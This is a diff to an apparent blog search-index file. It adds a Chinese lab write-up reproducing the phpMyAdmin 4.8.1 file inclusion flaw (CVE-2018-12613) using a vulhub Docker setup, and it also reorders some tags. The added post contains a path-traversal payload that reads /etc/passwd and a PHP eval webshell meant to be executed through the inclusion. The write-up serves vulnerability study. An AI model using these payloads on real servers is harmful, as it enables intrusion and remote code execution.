@@ -4,6 +4,41 @@
   
     
     <entry>
+      <title>PhpMyadmin 远程文件包含漏洞(CVE-2018-12613)</title>
+      <link href="/2022/05/12/PhpMyadmin-Remote-File-Inclusion/"/>
+      <url>/2022/05/12/PhpMyadmin-Remote-File-Inclusion/</url>
+      
+        <content type="html"><![CDATA[<h1 id="PhpMyadmin-远程文件包含漏洞"><a href="#PhpMyadmin-远程文件包含漏洞" class="headerlink" title="PhpMyadmin 远程文件包含漏洞"></a>PhpMyadmin 远程文件包含漏洞</h1><h2 id="漏洞简述"><a href="#漏洞简述" class="headerlink" title="漏洞简述"></a>漏洞简述</h2><blockquote><p>攻击者利用发现在服务器上包含（查看和潜在执行）文件的漏洞。该漏洞来自一部分代码，其中页面在phpMyAdmin中被重定向和加载，以及对白名单页面进行不正确的测试。</p><p>攻击者必须经过身份验证，但在这些情况下除外：</p><p><code>$ cfg [&#39;AllowArbitraryServer&#39;] = true</code>：攻击者可以指定他&#x2F;她已经控制的任何主机，并在phpMyAdmin上执行任意代码；</p><p><code>$ cfg [&#39;ServerDefault&#39;] = 0</code>：这会绕过登录并在没有任何身份验证的情况下运行易受攻击的代码。</p></blockquote><h2 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h2><blockquote><p>phpmyadmin 4.8.1-4.8.1</p></blockquote><h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><pre class=" language-Linux"><code class="language-Linux">cd vulhub/phpmyadmin/CVE-2018-12613docker-compose up -d</code></pre><h2 id="漏洞测试"><a href="#漏洞测试" class="headerlink" title="漏洞测试"></a>漏洞测试</h2><p>先打开网页<code>http://192.168.3.151:8080</code></p><p><img src="/2022/05/12/PhpMyadmin-Remote-File-Inclusion/image-20220512110650500.png" alt="image-20220512110650500"></p><p>可以通过远程文件包含查看<code>/etc/passwd</code></p><pre class=" language-bash"><code class="language-bash">?target<span class="token operator">=</span>db_sql.php%253f/<span class="token punctuation">..</span>/<span class="token punctuation">..</span>/<span class="token punctuation">..</span>/<span class="token punctuation">..</span>/etc/passwd</code></pre><p><code>ps:%25是%的url编码,%3f是?的url编码</code></p><h3 id="getshell"><a href="#getshell" class="headerlink" title="getshell"></a>getshell</h3><h4 id="第一种方法"><a href="#第一种方法" class="headerlink" title="第一种方法"></a>第一种方法</h4><p>在数据库test中新建一个表，表中注入一句话木马</p><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span> @<span class="token function">eval</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'hack'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter">?></span></code></pre><p><img src="/2022/05/12/PhpMyadmin-Remote-File-Inclusion/image-20220512134342919.png" alt="image-20220512134342919"></p><p><img src="/2022/05/12/PhpMyadmin-Remote-File-Inclusion/image-20220512134405848.png" alt="image-20220512134405848"></p><p>然后通过文件包含执行一句话木马</p>]]></content>
+      
+      
+      <categories>
+          
+          <category> 漏洞复现 </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> 环境搭建 </tag>
+            
+            <tag> 漏洞复现 </tag>
+            
+            <tag> 网络安全 </tag>
+            
+            <tag> vulhub </tag>
+            
+            <tag> CVE </tag>
+            
+            <tag> phpmyadmin </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
       <title>PhpMyAdmin远程代码执行(CVE-2016-5734)</title>
       <link href="/2022/05/11/PhpMyAdmin-Remote-code-Execution/"/>
       <url>/2022/05/11/PhpMyAdmin-Remote-code-Execution/</url>
@@ -2402,9 +2437,9 @@
             
             <tag> 工具使用 </tag>
             
-            <tag> msf </tag>
-            
             <tag> 木马 </tag>
+            
+            <tag> msf </tag>
             
             <tag> 免杀 </tag>
             
